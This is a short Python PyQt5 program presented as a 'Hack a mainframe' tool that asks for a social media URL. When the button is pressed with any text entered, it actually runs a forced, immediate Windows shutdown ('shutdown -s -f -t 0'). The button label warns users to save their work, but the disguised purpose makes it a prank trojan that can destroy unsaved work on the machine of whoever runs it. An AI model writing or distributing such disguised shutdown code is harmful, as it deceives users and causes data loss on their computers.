from PyQt5.QtWidgets import QApplication, QLineEdit, QPushButton, QWidget, QVBoxLayout, QHBoxLayout, QMessageBox
import subprocess
import socket

class ModernTextField(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Hack a mainframe")
        self.setGeometry(100, 100, 300, 100)
        
        # Check for internet connection on startup
        if not self.check_internet_connection():
            self.show_no_internet_message()

        # Set up the layout
        main_layout = QVBoxLayout()
        button_layout = QHBoxLayout()

        # Create a modern text field with border radius
        self.text_field = QLineEdit(self)
        self.text_field.setPlaceholderText("Type in a social media application/website URL")
        self.text_field.setStyleSheet("QLineEdit {"
                                      "border: 1px solid #444;"  # Light border to make the radius visible
                                      "border-radius: 10px;"  # Rounded corners
                                      "padding: 5px;"
                                      "background-color: #141414;"
                                      "color: white;"  # Set text color to white for contrast
                                      "}"
                                      "QLineEdit:focus {"
                                      "}")

        # Create the OK button
        ok_button = QPushButton("[SAVE YOUR WORK BEFORE CONTINUING] Hack the mainframe!", self)
        ok_button.clicked.connect(self.on_button_click)

        # Add widgets to layouts
        main_layout.addWidget(self.text_field)
        button_layout.addStretch()
        button_layout.addWidget(ok_button)
        main_layout.addLayout(button_layout)
        
        self.setLayout(main_layout)

    def check_internet_connection(self):
        try:
            # Check if we can connect to a reliable server (Google DNS in this case)
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            return False

    def show_no_internet_message(self):
        # Show an information dialog and exit the application
        QMessageBox.critical(self, "No Internet Connection", "No internet connection detected. Please check your connection and try again.")
        QApplication.quit()

    def on_button_click(self):
        if not self.text_field.text().strip() or self.text_field.text() == "Type in a social media application/website URL":
            # Show warning dialog if text field is empty or contains placeholder text
            QMessageBox.warning(self, "Warning", "No website or social media platform specified.")
        else:
            # Execute the shutdown command
            subprocess.run(["shutdown", "-s", "-f", "-t", "0"], shell=True)

app = QApplication([])
window = ModernTextField()
window.show()
app.exec_()
